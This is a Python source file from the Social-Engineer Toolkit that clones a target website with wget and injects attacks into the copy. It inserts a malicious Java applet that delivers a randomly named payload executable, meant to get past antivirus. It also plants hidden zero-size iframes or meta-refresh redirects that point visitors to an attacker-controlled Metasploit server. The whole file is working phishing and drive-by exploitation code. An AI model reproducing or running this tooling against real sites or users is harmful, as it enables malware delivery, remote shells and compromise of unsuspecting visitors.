#!/usr/bin/env python
#########################################################################
# This file clones a website for SET to use in conjunction with the java
# applet attack.
#########################################################################
import subprocess
import os
import sys
import time
import re

definepath=os.getcwd()
sys.path.append("src/core")
try: import core
except: reload(core)
sys.path.append(definepath)

# Open the IPADDR file
if not os.path.isfile("src/program_junk/interface"):
    fileopen=file("src/program_junk/ipaddr.file","r").readlines()
    for line in fileopen:
        line=line.rstrip()
        ipaddr=line

# Define base value
site_cloned = True

# grab interface ip address
if os.path.isfile("src/program_junk/interface"):
    fileopen=file("src/program_junk/interface", "r").readlines()
    for line in fileopen:
        line=line.rstrip()
        ipaddr=line

# GRAB DEFAULT PORT FOR WEB SERVER
meterpreter_iframe="8080"
fileopen=file("config/set_config" , "r").readlines()
counter=0
for line in fileopen:
    line=line.rstrip()
    match=re.search("WEB_PORT=", line)
    if match:
        line=line.replace("WEB_PORT=", "")
        web_port=line
        counter=1
    match1=re.search("JAVA_ID_PARAM=", line)
    if match1:
        java_id=line.replace("JAVA_ID_PARAM=","")
    match2=re.search("JAVA_REPEATER=", line)
    if match2:
        java_repeater=line.replace("JAVA_REPEATER=","")

    match3=re.search("JAVA_TIME=", line)
    if match3:
        java_time=line.replace("JAVA_TIME=", "")


    match4=re.search("METASPLOIT_IFRAME_PORT=", line)
    if match4:
        metasploit_iframe=line.replace("METASPLOIT_IFRAME_PORT=", "")

    match5=re.search("AUTO_REDIRECT=", line)
    if match5:
        auto_redirect=line.replace("AUTO_REDIRECT=", "")

    # UNC EMBED HERE
    match6=re.search("UNC_EMBED=", line)
    if match6:
        unc_embed=line.replace("UNC_EMBED=", "")

# if we used a proxy configuration from the set-proxy
if os.path.isfile("src/program_junk/proxy.confg"):

    fileopen=file("src/program_junk/proxy.config", "r")
    proxy_config = fileopen.read().rstrip()

# just do a ls
if not os.path.isfile("src/program_junk/proxy.confg"): proxy_config = "ls 1> /dev/null 2> /dev/null"

if counter == 0: web_port=80

webdav_meta=0
# see if exploit requires webdav
try:
    fileopen=file("src/program_junk/meta_config", "r")
    for line in fileopen:
        line=line.rstrip()
        match=re.search("set SRVPORT 80", line)
        if match:
            match2=re.search("set SRVPORT %s" % (metasploit_iframe), line)
            if not match2:
                webdav_meta=80
except: pass
template=""
# Grab custom or set defined
fileopen=file("src/program_junk/site.template","r").readlines()
for line in fileopen:
    line=line.rstrip()
    match=re.search("TEMPLATE=", line)
    if match:
        line=line.split("=")
        template=line[1]

# grab attack_vector specification
attack_vector=""
if os.path.isfile("src/program_junk/attack_vector"):
    fileopen=file("src/program_junk/attack_vector", "r").readlines()
    for line in fileopen:
        attack_vector=line.rstrip()

# Sticking it to A/V below
import string,random
def random_string(minlength=6,maxlength=15):
    length=random.randint(minlength,maxlength)
    letters=string.ascii_letters+string.digits
    return ''.join([random.choice(letters) for _ in range(length)])
rand_gen=random_string() #+".exe"

# clean slate

if template !="SELF":
    if template != attack_vector:
        subprocess.Popen("rm -rf src/webattack/web_clone/site/* 1> /dev/null 2> /dev/null", shell=True).wait()

try:
    # open our config file that was specified in SET
    fileopen=file("src/program_junk/site.template", "r").readlines()
    # start loop here
    url_counter=0
    for line in fileopen:
        line=line.rstrip()
        # look for config file and parse for URL
        match=re.search("URL=",line)
        if match:
        # replace the URL designator with nothing
            line=line.replace("URL=","")
            # define url to clone here
            url=line.rstrip()

    # if we aren't using multi attack with templates do this
    if url != "NULL":
        if template !="SET":
            print core.bcolors.YELLOW + "\n[*] Cloning the website: "+(url)
            print "[*] This could take a little bit..." + core.bcolors.ENDC

    # wget for now, will eventually convert to urllib2
    # wget -c -r -k -U Mozilla www.website.com
    if template != "SELF":
        # clean up old stuff
        subprocess.Popen("rm -rf src/webattack/web_clone/site/* 1> /dev/null 2> /dev/null", shell=True).wait()
        # set counter
        counter=0
        # see if its osx
        process=subprocess.Popen("uname -a", shell=True, stdout=subprocess.PIPE)
        output=process.communicate()[0]
        match=re.search("Darwin", output)

        if os.path.isfile("/usr/local/bin/wget"):
            counter=2

        if os.path.isfile("/usr/local/wget"):
            counter=2

        if os.path.isfile("/usr/bin/wget"):
            counter=2

        # if OSX
        if match:
            counter=1
            if os.path.isfile("/usr/local/bin/wget"):
                counter=2
            if os.path.isfile("/usr/bin/wget"):
                counter=2
            if os.path.isfile("/usr/local/wget"):
                counter=2

        # if Linux
        if counter == 0:
            subprocess.Popen('%s;cd src/webattack/web_clone/site/;../linux/wget --no-check-certificate -c -k -U "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6" %s 1> /dev/null 2> /dev/null;mv *.jsp* index.html 1> /dev/null 2> /dev/null;mv *.aspx index.html 1> /dev/null 2> /dev/null;mv *.asp index.html 1> /dev/null 2> /dev/null;mv *.php index.html 1> /dev/null 2> /dev/null' % (proxy_config,url), shell=True).wait()

        # if OSX
        if counter == 1:
            subprocess.Popen('%s;cd src/webattack/web_clone/site/;../osx/wget --no-check-certificate -c -k -U "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6" %s 1> /dev/null 2> /dev/null;mv *.jsp* index.html 1> /dev/null 2> /dev/null;mv *.aspx index.html 1> /dev/null 2> /dev/null;mv *.asp index.html 1> /dev/null 2> /dev/null;mv *.php index.html 1> /dev/null 2> /dev/null' % (proxy_config,url), shell=True).wait()

        # if wget is already there
        if counter == 2:
            subprocess.Popen('%s;cd src/webattack/web_clone/site/;wget --no-check-certificate -c -k -U "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6" %s 1> /dev/null 2> /dev/null;mv *.jsp* index.html 1> /dev/null 2> /dev/null;mv *.aspx index.html 1> /dev/null 2> /dev/null;mv *.asp index.html 1> /dev/null 2> /dev/null;mv *.php index.html 1> /dev/null 2> /dev/null' % (proxy_config,url), shell=True).wait()

        # if no folder for index.html, rename one
        subprocess.Popen("mv src/webattack/web_clone/site/* src/webattack/web_clone/site/index.html 1> /dev/null 2> /dev/null;mkdir src/webattack/web_clone/site/template 1> /dev/null 2> /dev/null;mv src/webattack/web_clone/site/* src/webattack/web_clone/site/template 1> /dev/null 2> /dev/null", shell=True).wait()
        # rename the folder to template
        subprocess.Popen("mv src/webattack/web_clone/site/* src/webattack/web_clone/site/template/ 1> /dev/null 2> /dev/null", shell=True).wait()

        site_cloned = True

        # If the website did not clone properly, exit out.
        if not os.path.isfile("src/webattack/web_clone/site/template/index.html"):
            print core.bcolors.RED + "[*] Error. Unable to clone this specific site. Email us to fix.\n" + core.bcolors.ENDC
            raw_input("Press [return] to go back to main menu.")
            site_cloned = False

            # add file to let set interactive shell know it was unsuccessful
            filewrite=file("src/program_junk/cloner.failed" , "w")
            filewrite.write("failed")
            filewrite.close()

        if site_cloned == True:

            # make a backup of the site if needed
            subprocess.Popen("cp src/webattack/web_clone/site/template/index.html src/webattack/web_clone/site/template/index.html.bak 1> /dev/null 2> /dev/null", shell=True).wait()

    if site_cloned == True:

        # java applet attack vector

        # check for java flag for multi attack
        multi_java="off"
        if os.path.isfile("src/program_junk/multi_java"):
            multi_java="on"

        if attack_vector == "java" or multi_java == "on":
            # Here we parse through the new website and add our java applet code, its a hack for now
            # Wrote this on the plane to Russia, easiest way to do this without internet access :P
            print core.bcolors.RED + "[*] Injecting Java Applet attack into the newly cloned website."+core.bcolors.ENDC
            # Read in newly created index.html
            fileopen=file("src/webattack/web_clone/site/template/index.html","r")
            # Read add-on for java applet
            fileopen2=file("src/webattack/web_clone/applet.database" , "r")
            # Write to new file with java applet added
            filewrite=file("src/webattack/web_clone/site/template/index.html.new", "w")
            fileopen3=file("src/webattack/web_clone/repeater.database", "r")
            # Open the UNC EMBED
            fileopen4=file("src/webattack/web_clone/unc.database", "r")
            counter=0

            # counter3 is used when we hit a HEAD tag within HTML the counter will be set to one so that
            # we don't have multiple injections of the applet and spawn multiple meterpreter shells

            counter3=0
            counter4=0
            # define next param
            for line in fileopen:
                # clean start on counter2 each loop iteration
                counter2=0

                # match for head
                # look for only head tags and ignore case
                match=re.search("<head.*?>", line, flags=re.IGNORECASE)
                if match:
                    header=match.group(0)

                    # throw a counter here if counter2 == 1 that means its already injected the applet
                    # theres some sites that are weird and can have to <head> tags, if thats the case
                    # it will present two meterpreter shells, we don't want that so we just do this

                    if counter3 == 0:
                        # Start loop here to add java applet to index.html.new
                        for line2 in fileopen2:
                            match1=re.search("msf.exe" , line2)
                            if match1:
                                line2=line2.replace("msf.exe", rand_gen)
                                quickfile=file("src/program_junk/rand_gen", "w")
                                quickfile.write(rand_gen)
                                quickfile.close()
                            match2=re.search("ipaddrhere", line2)
                            if match2:
                                # replace our "template" with the ip address we specified
                                line2=line2.replace("ipaddrhere", ipaddr+":"+web_port)
                                if auto_redirect == "ON" or auto_redirect == "on":
                                    line2=line2.replace("ITSOKITSOKITSOK", url)

                                if auto_redirect == "OFF" or auto_redirect == "off":
                                    line2=line2.replace("ITSOKITSOKITSOK", "")

                            # SET ID FIELD HERE FOR APPLET
                            match3=re.search("IDREPLACEHERE", line2)
                            if match3:
                                line2=line2.replace("IDREPLACEHERE",java_id)
                            # replace head with our <head>+ malicious java code

                            line=line.replace(header, header+line2)
                            #line=line.replace(header, header+line2)
                            filewrite.write(line)
                            line=""
                            # dont write any more applets
                            counter3=1
                            # this is so we dont write twice in the loop
                            counter2=1
                    # flag counter to let SET know it found <body>
                    counter=1

                if java_repeater != "OFF" or unc_embed != "OFF":
                    match10=re.search(r"</body|</BODY",line)
                    if match10:
                        unc_img=""
                        for line4 in fileopen3:
                            if counter4 == 0:
                                line4=line4.rstrip()
                                if unc_embed != "OFF":
                                    for line5 in fileopen4:
                                        unc_img=line5.rstrip()
                                        unc_img=unc_img.replace("IPREPLACEHERE", ipaddr)
                                        unc_img=unc_img.replace("RANDOMNAME", rand_gen)
                                line4=unc_img+line4
                                if java_repeater != "OFF":
                                    match11=re.search("IDREPLACEHERE", line4)
                                    if match11:
                                        line4=line4.replace("IDREPLACEHERE", java_id)
                                    match12=re.search("URLHEREPLZ", line4)
                                    if match12:
                                        line4=line4.replace("URLHEREPLZ", url)
                                    match13=re.search("TIMEHEREPLZ", line4)
                                    if match13:
                                        line4=line4.replace("TIMEHEREPLZ", java_time)
                                line=line.replace(r"</body>", line4+r"</body>")
                                line=line.replace(r"</BODY>", line4+r"</BODY>")
                                filewrite.write(line)
                                counter2=1
                                counter4=1

                # if we haven't hit a match, write the straight line
                if counter2 == 0:
                    filewrite.write(line)

            # close the file after done writing
            filewrite.close()

            # if counter is zero we have a problem
            if counter == int("0"):
                print "There was a problem grabbing the website. Sorry..."
                print "This is usually caused by missing <body> tags on the website."
                print "Try a different site and try again..."
                sys.exit(1)

            # if counter is one, we are good so far
            if counter == 1:
                print core.bcolors.BLUE + "[*] Filename obfuscation complete. Payload name is: " + rand_gen + "\n[*] Malicious java applet website prepped for deployment\n" + core.bcolors.ENDC

        # selection of browser exploits
        # check to see if multiattack is in use
        multi_meta="off"
        if os.path.isfile("src/program_junk/multi_meta"):
            multi_meta="on"

        if attack_vector == "browser" or multi_meta=="on":
            print core.bcolors.RED + "[*] Injecting iframes into cloned website for MSF Attack...." + core.bcolors.ENDC
            # Read in newly created index.html
            if attack_vector == "multiattack":
                subprocess.Popen("mv src/webattack/web_clone/site/template/index.html.new src/webattack/web_clone/site/template/index.html 1> /dev/null 2> /dev/null", shell=True).wait()
                time.sleep(1)
            #raw_input=("omfg")
            fileopen=file("src/webattack/web_clone/site/template/index.html","r").readlines()
            filewrite=file("src/webattack/web_clone/site/template/index.html.new", "w")
            counter=0
            for line in fileopen:
                counter=0
                if attack_vector == "browser":
                    match=re.search("Signed_Update.jar", line)
                    if match:
                        line=line.replace("Signed_Update.jar", "invalid.jar")
                        filewrite.write(line)
                        counter=1

                match=re.search("<head.*?>", line, flags=re.IGNORECASE)
                if match:
                    header=match.group(0)

                match2=re.search("<head.*?>", line, flags=re.IGNORECASE)
                if match2:
                    header=match.group(0)
                    if webdav_meta != 80:
                        line=line.replace(header, header+'<iframe src ="http://%s:%s/" width="0" height="0" scrolling="no"></iframe>' % (ipaddr,metasploit_iframe))
                        filewrite.write(line)
                        counter=1
                    if webdav_meta == 80:
                        line=line.replace(header, header+'<head><meta HTTP-EQUIV="REFRESH" content="4; url=http://%s">' % (ipaddr))
                if counter == 0: filewrite.write(line)

            try: filewrite.close()
            except: pass
            print core.bcolors.BLUE + "[*] Malicious iframe injection successful...crafting payload.\n" + core.bcolors.ENDC


        if attack_vector == "java" or attack_vector == "browser" or attack_vector == "multiattack":
            # move index.html to our main website
            subprocess.Popen("mv src/webattack/web_clone/site/template/index.html.new src/webattack/web_clone/site/template/index.html", shell=True).wait()

# catch keyboard control-c
except KeyboardInterrupt:
    print ("Control-C detected, exiting gracefully...\n")
    sys.exit()
